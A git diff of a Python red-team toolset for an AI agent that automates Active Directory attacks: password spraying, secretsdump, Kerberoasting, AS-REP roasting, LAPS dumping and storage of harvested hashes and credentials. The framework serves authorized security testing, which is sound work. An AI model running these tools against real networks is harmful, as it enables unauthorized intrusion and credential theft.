@@ -16,7 +16,7 @@ import socket
 import time
 import uuid
 from datetime import datetime, timezone
-from typing import Any
+from typing import Any, ClassVar
 
 import dreadnode as dn
 from dreadnode.agent.tools.base import Toolset
@@ -27,10 +27,14 @@ from ares.core.models import (
     Host,
     RedTeamState,
     Share,
+    SharedRedTeamState,
     TimelineEvent,
     User,
 )
 from ares.core.remote import run_remote
+
+# Type alias for state that works with both single-agent and multi-agent modes
+AnyRedTeamState = RedTeamState | SharedRedTeamState
 
 logger = logging.getLogger(__name__)
 
@@ -58,7 +62,7 @@ def _format_weakness_block(
     return "\n".join(lines)
 
 
-def _track_cross_domain_reuse(state: RedTeamState, credential: Credential) -> None:
+def _track_cross_domain_reuse(state: AnyRedTeamState, credential: Credential) -> None:
     if not state or not credential.domain:
         return
     same_creds = [
@@ -89,6 +93,42 @@ def _track_cross_domain_reuse(state: RedTeamState, credential: Credential) -> No
         state.weaknesses.append(block)
 
 
+def _is_ntlm_hash(value: str) -> bool:
+    if not value:
+        return False
+    normalized = value.strip()
+    if "$" in normalized:
+        return False
+    if ":" in normalized:
+        parts = normalized.split(":")
+        if len(parts) != 2:
+            return False
+        lm_part, ntlm_part = parts
+        if lm_part and not re.fullmatch(r"[0-9a-fA-F]{32}", lm_part):
+            return False
+        return bool(re.fullmatch(r"[0-9a-fA-F]{32}", ntlm_part))
+    return bool(re.fullmatch(r"[0-9a-fA-F]{32}", normalized))
+
+
+def _resolve_recon_route(cmd: list[str], target_role: str | None = None) -> str | None:
+    """Route netexec/ldapsearch calls to recon when not running there."""
+    if target_role:
+        return target_role
+    local_role = os.environ.get("ARES_ROLE", "").strip().lower()
+    if local_role == "recon":
+        return target_role
+    if not cmd:
+        return target_role
+    base = cmd[0]
+    if base in {"netexec", "ldapsearch"}:
+        return "recon"
+    if base in {"bash", "sh"} and len(cmd) >= 3 and cmd[1] in {"-c", "-lc"}:
+        script = cmd[2]
+        if re.search(r"\b(netexec|ldapsearch)\b", script):
+            return "recon"
+    return target_role
+
+
 def _run_tool(
     cmd: list[str],
     timeout_seconds: int = 300,
@@ -103,7 +143,8 @@ def _run_tool(
     Returns:
         Tuple of (stdout, stderr, return_code)
     """
-    result = run_remote(cmd, timeout_seconds=timeout_seconds, target_role=target_role)
+    resolved_role = _resolve_recon_route(cmd, target_role)
+    result = run_remote(cmd, timeout_seconds=timeout_seconds, target_role=resolved_role)
     return result.stdout, result.stderr, result.return_code
 
 
@@ -201,11 +242,61 @@ def _filter_users_file_remote(
 class NetworkEnumerationTools(Toolset):
     """Tools for network scanning and recon."""
 
-    state: RedTeamState | None = None
+    state: AnyRedTeamState | None = None
 
-    def set_state(self, state: RedTeamState) -> None:
+    def set_state(self, state: AnyRedTeamState) -> None:
         """Set the operation state for this toolset."""
         self.state = state
+
+    def _check_port(self, target: str, port: int, timeout_seconds: int = 5) -> bool:
+        cmd = ["nc", "-zv", "-w", str(timeout_seconds), target, str(port)]
+        try:
+            ssm_timeout = max(30, timeout_seconds + 5)
+            _stdout, _stderr, returncode = _run_tool(cmd, timeout_seconds=ssm_timeout)
+            return returncode == 0
+        except Exception:
+            return False
+
+    @dn.tool_method
+    def check_rdp_reachability(self, target: str, timeout_seconds: int = 5) -> str:
+        """
+        Check if RDP (3389) is reachable on a target.
+
+        Args:
+            target: Target host or IP
+            timeout_seconds: Port check timeout
+
+        Returns:
+            Reachability status message
+        """
+        reachable = self._check_port(target, 3389, timeout_seconds)
+        if reachable:
+            return f"[+] RDP port 3389 reachable on {target}"
+        return f"[!] RDP port 3389 not reachable on {target}"
+
+    @dn.tool_method
+    def check_winrm_reachability(self, target: str, timeout_seconds: int = 5) -> str:
+        """
+        Check if WinRM (5985/5986) is reachable on a target.
+
+        Args:
+            target: Target host or IP
+            timeout_seconds: Port check timeout
+
+        Returns:
+            Reachability status message
+        """
+        http_open = self._check_port(target, 5985, timeout_seconds)
+        https_open = self._check_port(target, 5986, timeout_seconds)
+        if http_open or https_open:
+            open_ports = []
+            if http_open:
+                open_ports.append("5985")
+            if https_open:
+                open_ports.append("5986")
+            ports = ", ".join(open_ports)
+            return f"[+] WinRM reachable on {target} (ports {ports})"
+        return f"[!] WinRM not reachable on {target} (ports 5985/5986 closed)"
 
     def _extract_users_from_outputs(self, outputs: list[tuple[str, str]]) -> set[str]:  # noqa: PLR0912
         users: set[str] = set()
@@ -374,6 +465,8 @@ class NetworkEnumerationTools(Toolset):
         )
         if hasattr(self.state, "add_credential"):
             self.state.add_credential(cred, "recon")
+            if getattr(self, "dispatcher", None):
+                self.dispatcher.signal_credential_access()
             return
         existing = any(
             c.username == cred.username and c.password == cred.password and c.domain == cred.domain
@@ -385,6 +478,11 @@ class NetworkEnumerationTools(Toolset):
         cred_key = self.state.get_credential_key(cred.username, cred.password, cred.domain)
         self.state.tested_credentials.add(cred_key)
         _track_cross_domain_reuse(self.state, cred)
+        if getattr(self, "dispatcher", None):
+            self.dispatcher.signal_credential_access()
+
+    def set_dispatcher(self, dispatcher) -> None:
+        self.dispatcher = dispatcher
 
     def _run_user_enum_commands(
         self, target: str, username: str, password: str, domain: str
@@ -504,7 +602,7 @@ class NetworkEnumerationTools(Toolset):
             notes.append("Target may be non-Windows or recon is blocked.")
 
         summary = self._summarize_enum_outputs(outputs)
-        message = "[!] SMB user recon did not return users."
+        message = "[!] SMB user enumeration did not return users."
         if summary:
             message += "\nPer-command status:\n" + summary
         if notes:
@@ -780,6 +878,8 @@ class NetworkEnumerationTools(Toolset):
         try:
             if not domain or not dns_ip:
                 return "[!] Domain and dns_ip are required for SRV lookup."
+            if self.state and hasattr(self.state, "add_domain"):
+                self.state.add_domain(domain)
             query = f"_ldap._tcp.dc._msdcs.{domain}"
             cmd = ["nslookup", "-type=srv", query, dns_ip]
             stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)
@@ -909,6 +1009,8 @@ class NetworkEnumerationTools(Toolset):
                     domain_hint = domain_match.group(1).strip()
 
             effective_domain = domain or domain_hint
+            if effective_domain and self.state and hasattr(self.state, "add_domain"):
+                self.state.add_domain(effective_domain)
             found_users = False
             found_passwords = False
             if output and self.state:
@@ -1022,6 +1124,44 @@ class NetworkEnumerationTools(Toolset):
                 )
             return hosts
 
+        def _parse_netexec_shares(output: str) -> list[Share]:
+            shares: list[Share] = []
+            in_table = False
+            for line in output.splitlines():
+                if not line.startswith("SMB"):
+                    continue
+                body = re.sub(r"^SMB\s+\S+\s+\d+\s+\S+\s+", "", line).strip()
+                if not body:
+                    continue
+                lower = body.lower()
+                if lower.startswith("share") and "permission" in lower:
+                    in_table = True
+                    continue
+                if in_table and set(body) <= {"-", " "}:
+                    continue
+                if in_table and (body.startswith("[") or lower.startswith("smb")):
+                    in_table = False
+                    continue
+                if not in_table:
+                    continue
+                parts = body.split(None, 2)
+                if not parts:
+                    continue
+                name = parts[0].strip()
+                if not name or name.lower() == "share":
+                    continue
+                permissions = parts[1].strip() if len(parts) > 1 else ""
+                comment = parts[2].strip() if len(parts) > 2 else ""
+                shares.append(
+                    Share(
+                        host=target,
+                        name=name,
+                        permissions=permissions,
+                        comment=comment,
+                    )
+                )
+            return shares
+
         try:
             cmd = ["netexec", "smb", target]
 
@@ -1044,6 +1184,15 @@ class NetworkEnumerationTools(Toolset):
                         self.state.add_host(host)
                     elif not any(h.ip == host.ip for h in self.state.hosts):
                         self.state.hosts.append(host)
+                for share in _parse_netexec_shares(output):
+                    if hasattr(self.state, "add_share"):
+                        self.state.add_share(share)
+                    else:
+                        if any(
+                            s.host == share.host and s.name == share.name for s in self.state.shares
+                        ):
+                            continue
+                        self.state.shares.append(share)
 
             return output
 
@@ -1052,55 +1201,62 @@ class NetworkEnumerationTools(Toolset):
             return f"Share recon failed for {target}: {e}"
 
     @dn.tool_method
-    def smbclient_kerberos_shares(self, target: str) -> str:
+    def smbclient_kerberos_shares(self, target: str, target_ip: str = "") -> str:
         """
         Enumerate SMB shares using Kerberos (no password) with smbclient.py.
 
         Args:
             target: Hostname or IP to query (Kerberos prefers FQDN)
+            target_ip: Optional IP to connect to when hostname does not resolve
 
         Returns:
             smbclient.py output
         """
         try:
-            cmd = ["smbclient.py", "-k", "-no-pass", f"@{target}"]
+            cmd = ["smbclient.py", "-k", "-no-pass"]
+            if target_ip:
+                cmd.extend(["-target-ip", target_ip])
+            cmd.append(f"@{target}")
             stdout, stderr, _ = _run_tool(cmd, timeout_seconds=180)
             output = stdout or stderr or ""
 
             if self.state and output:
-                in_table = False
-                for line in output.splitlines():
-                    if line.strip().startswith("Sharename"):
-                        in_table = True
-                        continue
-                    if in_table and set(line.strip()) <= {"-", " "}:
-                        continue
-                    if not in_table:
-                        continue
-                    if not line.strip():
-                        break
-                    parts = line.split(None, 2)
-                    if not parts:
-                        continue
-                    name = parts[0].strip()
-                    comment = parts[2].strip() if len(parts) > 2 else ""
-                    if not name:
-                        continue
-                    if any(s.host == target and s.name == name for s in self.state.shares):
-                        continue
-                    self.state.shares.append(
-                        Share(
-                            host=target,
-                            name=name,
-                            permissions="",
-                            comment=comment,
-                        )
-                    )
+                self._parse_smbclient_shares(output, target)
 
             return output
         except Exception as e:
             logger.error(f"smbclient share enum failed: {e!s}")
             return f"smbclient share enum failed: {e!s}"
+
+    def _parse_smbclient_shares(self, output: str, target: str) -> None:
+        """Parse smbclient share output and add shares to state."""
+        if not self.state:
+            return
+        state = self.state  # Local reference for type narrowing
+        in_table = False
+        for line in output.splitlines():
+            stripped = line.strip()
+            if stripped.startswith("Sharename"):
+                in_table = True
+                continue
+            if in_table and set(stripped) <= {"-", " "}:
+                continue
+            if not in_table or not stripped:
+                if not stripped:
+                    break
+                continue
+            parts = line.split(None, 2)
+            if not parts:
+                continue
+            name = parts[0].strip()
+            if not name:
+                continue
+            comment = parts[2].strip() if len(parts) > 2 else ""
+            share = Share(host=target, name=name, permissions="", comment=comment)
+            if hasattr(state, "add_share"):
+                state.add_share(share)
+            elif not any(s.host == target and s.name == name for s in state.shares):
+                state.shares.append(share)
 
     @dn.tool_method
     def save_users_to_file(
@@ -1158,11 +1314,44 @@ class CredentialDiscoveryTools(Toolset):
     - Password spraying with common passwords
     """
 
-    state: RedTeamState | None = None
+    state: AnyRedTeamState | None = None
+    _PLACEHOLDER_PASSWORDS: ClassVar[set[str]] = {"password", "changeme", "<password>"}
 
-    def set_state(self, state: RedTeamState) -> None:
+    def set_state(self, state: AnyRedTeamState) -> None:
         """Set the operation state for this toolset."""
         self.state = state
+
+    def _resolve_password(
+        self,
+        username: str,
+        domain: str | None,
+        password: str | None,
+    ) -> str | None:
+        if not password:
+            return password
+        normalized = password.strip().lower()
+        if normalized not in self._PLACEHOLDER_PASSWORDS:
+            return password
+        if not self.state:
+            return password
+        credentials = getattr(self.state, "all_credentials", None)
+        if credentials is None:
+            credentials = getattr(self.state, "credentials", [])
+        username_key = username.strip().lower()
+        domain_key = (domain or "").strip().lower()
+        for cred in credentials:
+            if cred.username.strip().lower() != username_key:
+                continue
+            if domain_key and cred.domain.strip().lower() != domain_key:
+                continue
+            if cred.password:
+                logger.info(
+                    "Replaced placeholder password for %s\\%s from shared state",
+                    cred.domain or domain,
+                    cred.username,
+                )
+                return cred.password
+        return password
 
     def _run_user_enum_commands(
         self, target: str, username: str, password: str, domain: str
@@ -1197,6 +1386,8 @@ class CredentialDiscoveryTools(Toolset):
         )
         if hasattr(self.state, "add_credential"):
             self.state.add_credential(cred, "recon")
+            if getattr(self, "dispatcher", None):
+                self.dispatcher.signal_credential_access()
             return
         existing = any(
             c.username == cred.username and c.password == cred.password and c.domain == cred.domain
@@ -1209,13 +1400,40 @@ class CredentialDiscoveryTools(Toolset):
         self.state.tested_credentials.add(cred_key)
 
         _track_cross_domain_reuse(self.state, cred)
+        if getattr(self, "dispatcher", None):
+            self.dispatcher.signal_credential_access()
+
+    def set_dispatcher(self, dispatcher) -> None:
+        self.dispatcher = dispatcher
 
     def _parse_netexec_credentials(self, result: str) -> list[tuple[str, str, str, bool]]:
         creds: list[tuple[str, str, str, bool]] = []
         if not result:
             return creds
+        failure_markers = (
+            "STATUS_LOGON_FAILURE",
+            "STATUS_PASSWORD_EXPIRED",
+            "STATUS_PASSWORD_MUST_CHANGE",
+            "STATUS_ACCOUNT_LOCKED_OUT",
+            "STATUS_ACCOUNT_DISABLED",
+            "STATUS_ACCOUNT_RESTRICTION",
+            "STATUS_NO_LOGON_SERVERS",
+            "STATUS_ACCESS_DENIED",
+            "STATUS_INVALID_LOGON_HOURS",
+            "STATUS_INVALID_WORKSTATION",
+            "NT_STATUS_",
+            "LOGON FAILURE",
+            "LOGON_FAILURE",
+            "ACCESS_DENIED",
+        )
         for line in result.splitlines():
             if "[+]" not in line and "Pwn3d!" not in line:
+                continue
+            line_upper = line.upper()
+            if any(marker in line_upper for marker in failure_markers):
+                continue
+            # Treat Guest-only SMB access as non-credential to avoid false positives.
+            if "(Guest)" in line:
                 continue
             match = re.search(r"([A-Za-z0-9_.-]+)\\([^:\s]+):(\S+)", line)
             if not match:
@@ -1365,6 +1583,12 @@ class CredentialDiscoveryTools(Toolset):
         Example:
             >>> ldap_search_descriptions("192.168.56.10", "example.local", "user", "pass")
         """
+        resolved_password = self._resolve_password(username, domain, password)
+        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
+            return "[!] Refusing to use placeholder password; provide a real credential."
+        if self.state and hasattr(self.state, "add_domain"):
+            self.state.add_domain(domain)
+
         # Convert domain to base DN
         base_dn = ",".join([f"DC={part}" for part in domain.split(".")])
 
@@ -1377,7 +1601,7 @@ class CredentialDiscoveryTools(Toolset):
             "-D",
             f"{username}@{domain}",
             "-w",
-            password,
+            resolved_password or "",
             "-b",
             base_dn,
             "(&(objectClass=user)(description=*))",
@@ -1521,9 +1745,16 @@ class CredentialDiscoveryTools(Toolset):
             stdout, stderr, _returncode = _run_tool(cmd, timeout_seconds=300)
 
             result = stdout + "\n" + (stderr or "")
+            creds = self._parse_netexec_credentials(result)
+            matching_creds = [cred for cred in creds if cred[2] == password]
 
-            # Check for successful authentications
-            if "[+]" in result or "Pwn3d!" in result:
+            if creds and not matching_creds:
+                logger.warning(
+                    "[!] Password spray parsed credentials, but none matched the sprayed password; "
+                    "ignoring to avoid false positives."
+                )
+
+            if matching_creds:
                 logger.warning("[!] PASSWORD SPRAY FOUND VALID CREDENTIALS!")
                 result = (
                     "🚨 VALID CREDENTIALS FOUND!\n"
@@ -1531,31 +1762,34 @@ class CredentialDiscoveryTools(Toolset):
                     "→ 'Pwn3d!' indicates ADMIN access\n"
                     "→ Use found credentials for further recon\n\n" + result
                 )
+            elif "(Guest)" in result:
+                # Remove guest-only lines to avoid false credential reporting.
+                filtered_lines = [line for line in result.splitlines() if "(Guest)" not in line]
+                result = "\n".join(filtered_lines)
+                result += "\n[!] Guest-only SMB access detected; ignore as valid credentials."
 
-            if self.state:
-                creds = self._parse_netexec_credentials(result)
-                if creds:
-                    accounts = []
-                    for cred_domain, username, found_password, is_admin in creds:
-                        self._add_credential(
-                            username,
-                            found_password,
-                            cred_domain,
-                            "password_spray",
-                            is_admin=is_admin,
-                        )
-                        accounts.append(f"{cred_domain}\\{username}")
-                    block = _format_weakness_block(
-                        "Credential Discovery - Password Spray Success",
-                        "Weak password choice allows password spraying",
-                        {
-                            "Discovered Accounts": ", ".join(sorted(set(accounts))),
-                            "Password": password,
-                        },
-                        "Enables credential stuffing and rapid access",
-                        "Password spraying",
+            if self.state and matching_creds:
+                accounts = []
+                for cred_domain, username, found_password, is_admin in matching_creds:
+                    self._add_credential(
+                        username,
+                        found_password,
+                        cred_domain,
+                        "password_spray",
+                        is_admin=is_admin,
                     )
-                    self._add_weakness(block)
+                    accounts.append(f"{cred_domain}\\{username}")
+                block = _format_weakness_block(
+                    "Credential Discovery - Password Spray Success",
+                    "Weak password choice allows password spraying",
+                    {
+                        "Discovered Accounts": ", ".join(sorted(set(accounts))),
+                        "Password": password,
+                    },
+                    "Enables credential stuffing and rapid access",
+                    "Password spraying",
+                )
+                self._add_weakness(block)
 
             return result
 
@@ -1667,11 +1901,17 @@ class CredentialDiscoveryTools(Toolset):
 
             result = stdout + "\n" + (stderr or "")
 
-            # Check for successful authentications
+            # Check for successful authentications, but only accept true username=password matches.
             creds = self._parse_netexec_credentials(result)
-            if creds:
+            matching: list[tuple[str, str, str, bool]] = []
+            for cred_domain, username, found_password, is_admin in creds:
+                if found_password.lower() != username.lower():
+                    continue
+                matching.append((cred_domain, username, found_password, is_admin))
+
+            if matching:
                 accounts = sorted(
-                    {f"{cred_domain}\\{username}" for cred_domain, username, _, _ in creds}
+                    {f"{cred_domain}\\{username}" for cred_domain, username, _, _ in matching}
                 )
                 logger.warning(
                     "[!] FOUND USER WITH USERNAME=PASSWORD! Accounts: %s",
@@ -1683,14 +1923,22 @@ class CredentialDiscoveryTools(Toolset):
                     "→ Common examples: user1:user1, guest:guest\n"
                     "→ Use found credentials for kerberoast, asrep_roast, bloodhound\n\n" + result
                 )
+            elif creds:
+                logger.warning(
+                    "[!] username_as_password saw successful auth, but none matched username=password; "
+                    "ignoring to avoid false positives."
+                )
+            if "(Guest)" in result:
+                filtered_lines = [line for line in result.splitlines() if "(Guest)" not in line]
+                result = "\n".join(filtered_lines)
+                result += "\n[!] Guest-only SMB access detected; ignore as valid credentials."
             # If output contains [+] but no parseable creds, avoid a noisy warning.
 
-            if self.state and creds:
-                for cred_domain, username, found_password, is_admin in creds:
-                    password_value = found_password or username
+            if self.state and matching:
+                for cred_domain, username, found_password, is_admin in matching:
                     self._add_credential(
                         username,
-                        password_value,
+                        found_password,
                         cred_domain,
                         "username_as_password",
                         is_admin=is_admin,
@@ -1699,7 +1947,7 @@ class CredentialDiscoveryTools(Toolset):
                     "Credential Discovery - Username=Password Combinations",
                     "Users with passwords matching their usernames",
                     {
-                        "Discovered Accounts": ", ".join(accounts),
+                        "Discovered Accounts": ", ".join(sorted(set(accounts))),
                     },
                     "Immediate authenticated access",
                     "Username-as-password test",
@@ -1841,6 +2089,10 @@ class CredentialDiscoveryTools(Toolset):
         Example:
             >>> laps_dump("192.168.56.10", "example.local", "user", "pass")
         """
+        resolved_password = self._resolve_password(username, domain, password)
+        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
+            return "[!] Refusing to use placeholder password; provide a real credential."
+
         cmd = [
             "netexec",
             "ldap",
@@ -1848,7 +2100,7 @@ class CredentialDiscoveryTools(Toolset):
             "-u",
             username,
             "-p",
-            password,
+            resolved_password or "",
             "-d",
             domain,
             "-M",
@@ -1878,9 +2130,9 @@ class CredentialDiscoveryTools(Toolset):
 class PostureValidationTools(Toolset):
     """Tools for validating AD security posture on compromised hosts."""
 
-    state: RedTeamState | None = None
+    state: AnyRedTeamState | None = None
 
-    def set_state(self, state: RedTeamState) -> None:
+    def set_state(self, state: AnyRedTeamState) -> None:
         """Set the operation state for this toolset."""
         self.state = state
 
@@ -2161,11 +2413,44 @@ class PostureValidationTools(Toolset):
 class CredentialHarvestingTools(Toolset):
     """Tools for harvesting credentials via Active Directory attacks."""
 
-    state: RedTeamState | None = None
+    state: AnyRedTeamState | None = None
+    _PLACEHOLDER_PASSWORDS: ClassVar[set[str]] = {"password", "changeme", "<password>"}
 
-    def set_state(self, state: RedTeamState) -> None:
+    def set_state(self, state: AnyRedTeamState) -> None:
         """Set the operation state for this toolset."""
         self.state = state
+
+    def _resolve_password(
+        self,
+        username: str,
+        domain: str | None,
+        password: str | None,
+    ) -> str | None:
+        if not password:
+            return password
+        normalized = password.strip().lower()
+        if normalized not in self._PLACEHOLDER_PASSWORDS:
+            return password
+        if not self.state:
+            return password
+        credentials = getattr(self.state, "all_credentials", None)
+        if credentials is None:
+            credentials = getattr(self.state, "credentials", [])
+        username_key = username.strip().lower()
+        domain_key = (domain or "").strip().lower()
+        for cred in credentials:
+            if cred.username.strip().lower() != username_key:
+                continue
+            if domain_key and cred.domain.strip().lower() != domain_key:
+                continue
+            if cred.password:
+                logger.info(
+                    "Replaced placeholder password for %s\\%s from shared state",
+                    cred.domain or domain,
+                    cred.username,
+                )
+                return cred.password
+        return password
 
     def _check_smb_connectivity(self, target: str, timeout_seconds: int = 5) -> tuple[bool, str]:
         """Check if SMB port 445 is reachable on target.
@@ -2189,7 +2474,7 @@ class CredentialHarvestingTools(Toolset):
             return False, f"Connectivity check failed: {e}"
 
     @dn.tool_method
-    def secretsdump(
+    def secretsdump(  # noqa: PLR0912
         self,
         target: str,
         username: str,
@@ -2229,6 +2514,24 @@ class CredentialHarvestingTools(Toolset):
             >>> secretsdump("192.168.1.100", "admin", hash="aad3b4...")
             >>> secretsdump("domain.local", "admin", no_pass=True)
         """
+        resolved_password = self._resolve_password(username, domain, password)
+        if hash and not _is_ntlm_hash(hash):
+            return (
+                "[!] Refusing to use non-NTLM hash for secretsdump; provide password or NTLM hash."
+            )
+        if (
+            hash
+            and resolved_password
+            and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS
+        ):
+            resolved_password = None
+        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
+            return "[!] Refusing to use placeholder password; provide a real credential."
+        if self.state and hasattr(self.state, "add_domain") and domain:
+            self.state.add_domain(domain)
+        if self.state and hasattr(self.state, "add_domain") and domain:
+            self.state.add_domain(domain)
+
         # Pre-check SMB connectivity to fail fast
         if not skip_connectivity_check:
             is_reachable, error_msg = self._check_smb_connectivity(target)
@@ -2242,10 +2545,10 @@ class CredentialHarvestingTools(Toolset):
         if dc_ip:
             cmd.extend(["-dc-ip", dc_ip])
 
-        if password and domain:
-            target_string = f"{domain}/{username}:{password}@{target}"
-        elif password and not domain:
-            target_string = f"{username}:{password}@{target}"
+        if resolved_password and domain:
+            target_string = f"{domain}/{username}:{resolved_password}@{target}"
+        elif resolved_password and not domain:
+            target_string = f"{username}:{resolved_password}@{target}"
         elif hash and domain:
             cmd.extend(["-hashes", f":{hash}"])
             target_string = f"{domain}/{username}@{target}"
@@ -2309,9 +2612,13 @@ class CredentialHarvestingTools(Toolset):
         Example:
             >>> kerberoast("example.local", "user", "pass", "192.168.1.100")
         """
+        resolved_password = self._resolve_password(username, domain, password)
+        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
+            return "[!] Refusing to use placeholder password; provide a real credential."
+
         cmd = [
             "impacket-GetUserSPNs",
-            f"{domain}/{username}:{password}",
+            f"{domain}/{username}:{resolved_password}",
             "-dc-ip",
             dc_ip,
             "-request",
@@ -2320,7 +2627,34 @@ class CredentialHarvestingTools(Toolset):
         try:
             logger.info(f"[*] Kerberoasting {domain} using {username}")
             stdout, stderr, _ = _run_tool(cmd, timeout_seconds=60)
-            return stdout or stderr
+            output = (stdout or "") + ("\n" + stderr if stderr else "")
+
+            # Persist any Kerberoast TGS hashes for cracking/loot visibility.
+            if self.state and output:
+                matches = re.findall(r"(\$krb5tgs\$[^\s]+)", output)
+                for value in matches:
+                    username_value = "Unknown"
+                    domain_value = ""
+                    parts = value.split("$")
+                    if len(parts) >= 5:
+                        user_part = parts[3].lstrip("*")
+                        realm_part = parts[4]
+                        if user_part:
+                            username_value = user_part
+                        if realm_part:
+                            domain_value = realm_part
+                    hash_obj = Hash(
+                        username=username_value,
+                        hash_value=value,
+                        hash_type="Kerberos",
+                        domain=domain_value or domain,
+                    )
+                    if hasattr(self.state, "add_hash"):
+                        self.state.add_hash(hash_obj, "kerberoast")
+                    else:
+                        self.state.hashes.append(hash_obj)
+
+            return output
 
         except Exception as e:
             return f"Kerberoasting failed: {e!s}"
@@ -2360,17 +2694,18 @@ class CredentialHarvestingTools(Toolset):
                     users_file = ""
 
             if not users_file:
-                default_users = [
-                    "administrator",
-                    "guest",
-                    "krbtgt",
-                    "svc",
-                    "helpdesk",
-                    "backup",
-                    "sqlsvc",
-                ]
+                enumerated_users: list[str] = []
+                if self.state and self.state.users:
+                    enumerated_users = sorted(
+                        {user.username for user in self.state.users if user.username}
+                    )
+                if not enumerated_users:
+                    return (
+                        "[!] No users_file provided and no enumerated users available. "
+                        "Enumerate users first, then retry Kerberos no-auth with a users list."
+                    )
                 remote_temp_file = f"/tmp/ares-userlist-{uuid.uuid4().hex}.txt"  # nosec B108  # noqa: S108
-                users_payload = "\n".join(default_users)
+                users_payload = "\n".join(enumerated_users)
                 users_file = remote_temp_file
 
             if remote_temp_file:
@@ -2395,6 +2730,8 @@ class CredentialHarvestingTools(Toolset):
                 ]
 
             logger.info(f"[*] Kerberos user recon (no-auth) against {domain} via {dc_ip}")
+            if self.state and hasattr(self.state, "add_domain"):
+                self.state.add_domain(domain)
             stdout, stderr, _ = _run_tool(cmd, timeout_seconds=180)
             output = (stdout or "") + ("\n" + stderr if stderr else "")
 
@@ -2441,9 +2778,39 @@ class CredentialHarvestingTools(Toolset):
                     file_note = f"\nUsers file: {users_file}"
                 else:
                     file_note = f"\n[!] Failed to write users file on remote: {error}"
-                return f"✓ Valid principals (Kerberos no-auth): {summary}{file_note}\n\n{output}"
+                result = f"✓ Valid principals (Kerberos no-auth): {summary}{file_note}\n\n{output}"
+            else:
+                result = output
 
-            return output
+            # Capture any AS-REP hashes surfaced by GetNPUsers (-no-pass).
+            if self.state and output:
+                matches = re.findall(
+                    r"(\$krb5asrep\$\d+\$[^\s:$]+@[^\s:$]+:[0-9a-fA-F]{32}\$[0-9a-fA-F]+)",
+                    output,
+                )
+                for value in matches:
+                    username_value = "Unknown"
+                    domain_value = ""
+                    parts = value.split("$", 3)
+                    if len(parts) >= 4:
+                        user_realm_part = parts[3]
+                        user_realm = user_realm_part.split(":", 1)[0]
+                        if "@" in user_realm:
+                            username_value, domain_value = user_realm.split("@", 1)
+                        elif user_realm:
+                            username_value = user_realm
+                    hash_obj = Hash(
+                        username=username_value,
+                        hash_value=value,
+                        hash_type="AS-REP",
+                        domain=domain_value or domain,
+                    )
+                    if hasattr(self.state, "add_hash"):
+                        self.state.add_hash(hash_obj, "kerberos_noauth")
+                    else:
+                        self.state.hashes.append(hash_obj)
+
+            return result
 
         except Exception as e:
             return f"Kerberos user recon (no-auth) failed: {e!s}"
@@ -2475,9 +2842,13 @@ class CredentialHarvestingTools(Toolset):
         Example:
             >>> asrep_roast("example.local", "user", "pass", "192.168.1.100")
         """
+        resolved_password = self._resolve_password(username, domain, password)
+        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
+            return "[!] Refusing to use placeholder password; provide a real credential."
+
         cmd = [
             "impacket-GetNPUsers",
-            f"{domain}/{username}:{password}",
+            f"{domain}/{username}:{resolved_password}",
             "-dc-ip",
             dc_ip,
             "-request",
@@ -2486,7 +2857,37 @@ class CredentialHarvestingTools(Toolset):
         try:
             logger.info(f"[*] AS-REP roasting {domain} using {username}")
             stdout, stderr, _ = _run_tool(cmd, timeout_seconds=60)
-            return stdout or stderr
+            output = stdout or stderr or ""
+
+            # Persist any AS-REP hashes found so they appear in loot/cracking flows.
+            if self.state and output:
+                matches = re.findall(
+                    r"(\$krb5asrep\$\d+\$[^\s:$]+@[^\s:$]+:[0-9a-fA-F]{32}\$[0-9a-fA-F]+)",
+                    output,
+                )
+                for value in matches:
+                    username_value = "Unknown"
+                    domain_value = ""
+                    parts = value.split("$", 3)
+                    if len(parts) >= 4:
+                        user_realm_part = parts[3]
+                        user_realm = user_realm_part.split(":", 1)[0]
+                        if "@" in user_realm:
+                            username_value, domain_value = user_realm.split("@", 1)
+                        elif user_realm:
+                            username_value = user_realm
+                    hash_obj = Hash(
+                        username=username_value,
+                        hash_value=value,
+                        hash_type="AS-REP",
+                        domain=domain_value,
+                    )
+                    if hasattr(self.state, "add_hash"):
+                        self.state.add_hash(hash_obj, "asrep_roast")
+                    else:
+                        self.state.hashes.append(hash_obj)
+
+            return output
 
         except Exception as e:
             return f"AS-REP roasting failed: {e!s}"
@@ -2519,12 +2920,22 @@ class CredentialHarvestingTools(Toolset):
             >>> domain_admin_checker("192.168.1.100 192.168.1.101", "Administrator", password="P@ss")  # pragma: allowlist secret
             >>> domain_admin_checker("192.168.1.100 192.168.1.101", "Administrator", hash="aad3b4...")
         """
+        resolved_password = self._resolve_password(username, "", password or None)
+        if (
+            hash
+            and resolved_password
+            and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS
+        ):
+            resolved_password = None
+        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
+            return "[!] Refusing to use placeholder password; provide a real credential."
+
         try:
             cmd = ["netexec", "smb"] + targets.split(" ")
 
-            if password:
+            if resolved_password:
                 logger.info(f"[*] Domain admin checker using password for {username}")
-                cmd.extend(["-u", username, "-p", password])
+                cmd.extend(["-u", username, "-p", resolved_password])
             elif hash:
                 logger.info(f"[*] Domain admin checker using hash for {username}")
                 cmd.extend(["-u", username, "-H", hash])
@@ -2550,11 +2961,79 @@ class CredentialHarvestingTools(Toolset):
 class CrackingTools(Toolset):
     """Tools for password hash cracking."""
 
-    state: RedTeamState | None = None
+    state: AnyRedTeamState | None = None
 
-    def set_state(self, state: RedTeamState) -> None:
+    def set_state(self, state: AnyRedTeamState) -> None:
         """Set the operation state for this toolset."""
         self.state = state
+
+    def _build_user_wordlist(self) -> str | None:
+        if not self.state:
+            return None
+
+        usernames = self._collect_usernames_from_state()
+        words = self._generate_password_candidates(usernames)
+
+        if not words:
+            return None
+
+        import tempfile
+
+        wordlist_path = f"{tempfile.gettempdir()}/ares_users_{int(time.time())}.txt"
+        with open(wordlist_path, "w", encoding="ascii") as handle:
+            handle.writelines(f"{word}\n" for word in sorted(words))
+
+        return wordlist_path
+
+    def _collect_usernames_from_state(self) -> set[str]:
+        """Collect usernames from state objects."""
+        usernames: set[str] = set()
